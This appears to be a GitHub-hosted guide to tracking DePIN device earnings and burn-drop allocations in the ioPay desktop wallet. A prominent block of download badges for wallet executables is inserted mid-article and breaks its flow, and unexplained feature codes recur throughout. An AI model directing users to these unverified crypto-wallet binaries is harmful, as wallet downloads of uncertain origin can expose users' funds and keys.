![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Tracking DePIN Device Rewards in ioPay Wallet

**You earn from DePIN by contributing a resource a network actually needs - bandwidth, storage, sensor data, compute - not by holding a wallet.** The wallet's job is narrower and genuinely useful: it shows what each registered device has been credited, keeps burn-drop allocations visible against your staking buckets, and exports the record when you need it (F025, F027).

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That division matters, because most disappointment in this category comes from expecting the wallet to be the source of earnings rather than the instrument that measures them.

## Step 1: get the device registered

Nothing can be tracked until the device has an on-chain identity. `ioID` is IoTeX's device identity layer, and this build offers one-click registration from the DePIN section (F025, F033). [The registration guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/registering-an-ioid-device-with-iopay.md) covers the flow and the failure cases.

Once registered, the device appears in the list. If it does not, the cause is almost always one of: not registered, registered to a different account, or an app that cannot reach the chain.

## Step 2: record a baseline

When a device first earns, note three things:

- the **date**,
- the **amount** as the dashboard shows it,
- the **project** it came from.

A number without a date cannot be interpreted a month later, because reward rates move and projects change their schedules. The baseline is what turns a dashboard into a record.

## Step 3: keep the two mechanisms apart

This is the tracking mistake that produces most "my rewards don't add up" messages:

| Mechanism | What it is | Where it attaches |
|---|---|---|
| **Device earnings** | payment from a project for the resource your device contributes | the device |
| **Burn-drop allocation** | a chain mechanism: device activation burns IOTX and restakes it to qualified staking buckets (F033) | a **staking bucket** |

If you add them together and compare to a project dashboard, the numbers will not match - you are comparing one project's record against a blend of project records and chain state. Track them in separate columns, and reconcile each against its own source.

Burn-drop is also why staking matters to a device owner: allocations qualify against staking buckets, so what you stake and for how long affects the allocation side. [Staking, buckets and stake-lock](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md).

## Step 4: check on a cadence, not constantly

Device earnings update at the project's pace, not yours. A weekly check is enough for most setups:

1. Device list - is everything still registered?
2. Earnings per device - did anything move, and does the movement match the project's own dashboard?
3. Burn-drop allocations - did the staking side change (a new bucket, a stake-lock change)?
4. Calculator - if you are planning a change, project it at the current rate, and remember it is arithmetic, not a forecast.

## Step 5: export, if you report the income

The wallet's portfolio and tax export includes a staking-rewards report (F027). Used well, that gives you dated records to hand to an accountant.

Used badly, it invites two mistakes: treating the export as tax advice, and assuming it captures income that a project reports only in its own dashboard. The export is a starting point; the project's records are the authority on its rewards.

## What tracking cannot tell you

**Whether the setup is profitable.** Hardware cost, electricity, the token's value and the project's rate are all outside the wallet.

**Whether the rate will hold.** Projects change rewards. A calculator that projects at today's rate is honest about the projection and silent about the future.

**Whether a project will keep operating.** That is a project risk, and it is why [the project explorer](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-depin-project-explorer.md) is a directory rather than a recommendation.

## A realistic expectation

Device earnings are usually small and variable, and they depend on things you do not control. Anyone promising a figure - per device, per day, "passive" - is describing a best case as if it were a guarantee. Track what happens, reconcile against the project, and judge the setup on your own numbers rather than on a projection.

## FAQ

**How do I make money with DePIN?**
By contributing hardware that a network pays for - bandwidth, storage, sensor data, compute. The wallet measures it; it does not generate it.

**How often do rewards arrive?**
At the project's cadence, which varies and can change. Check the project's own dashboard for its schedule.

**Can I export the numbers?**
Yes - the portfolio and tax export includes a staking-rewards report (F027). It is a record, not tax advice.

**Why do device earnings and burn-drop not match?**
They are different mechanisms with different sources. Device earnings come from a project; burn-drop allocations attach to qualified staking buckets.

**Do I need to stake to earn from a device?**
Not for device earnings. Burn-drop allocations depend on qualified staking buckets, so that side does require staking.

## Two patterns worth naming early

**Earnings flat, device fine.** A reward rate that stops moving while the device keeps contributing is usually a project-side change - a schedule adjustment, a different rate, a pause. The wallet is reporting what the project reports; check the project's own dashboard before assuming a display fault.

**Device fine, earnings gone.** A device that disappears from the earnings view has usually lost its registration or moved account, not stopped working. That is a registration question ([the registration guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/registering-an-ioid-device-with-iopay.md)), and it is worth resolving before you touch anything else.

Naming which of the two you are looking at saves a lot of unnecessary reinstalling.

## When a project changes its rate

Reward rates belong to the project, and they change without notice to anyone's wallet. A week that earns noticeably less is usually a rate change, not a broken device and not a wallet fault; the project's own dashboard is where the new terms appear first.

Keeping the baseline from the first earning week is what makes that visible. Without it, a lower number has nothing to be lower than, and the temptation is to reinstall software that was never at fault. Record the date of any change you notice, so the next comparison starts from a number you trust.

---

*Dashboard, export and calculator behaviour follow the v2.0.2 feature set; ioID and burn-drop follow IoTeX documentation. No rate or income figure is stated.*
